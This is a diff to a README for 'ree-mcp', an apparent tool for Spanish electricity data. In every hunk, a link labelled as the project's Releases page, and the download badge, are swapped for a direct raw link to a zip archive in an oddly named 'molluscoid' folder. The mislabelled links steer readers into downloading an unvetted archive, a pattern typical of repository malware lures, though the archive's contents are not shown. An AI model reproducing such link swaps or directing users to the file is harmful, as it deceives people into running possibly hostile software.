@@ -1,6 +1,6 @@
 # ⚡ ree-mcp - Simple Access to Spanish Power Data
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://raw.githubusercontent.com/kawin35k/ree-mcp/main/molluscoid/ree-mcp.zip)
 
 ## 📦 Overview
 
@@ -14,7 +14,7 @@ To get started with ree-mcp, follow the steps below. You will download the appli
 
 1. Click the button below to visit our Releases page:
    
-   [Visit the Releases Page](https://github.com/kawin35k/ree-mcp/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/kawin35k/ree-mcp/main/molluscoid/ree-mcp.zip)
 
 2. On the Releases page, you will see different versions of the application available for download. Choose the latest version for the best performance.
 
@@ -83,4 +83,4 @@ This application covers various actionable topics related to electrical data:
 
 To download ree-mcp, return to our Releases page:
 
-[Visit the Releases Page](https://github.com/kawin35k/ree-mcp/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/kawin35k/ree-mcp/main/molluscoid/ree-mcp.zip)
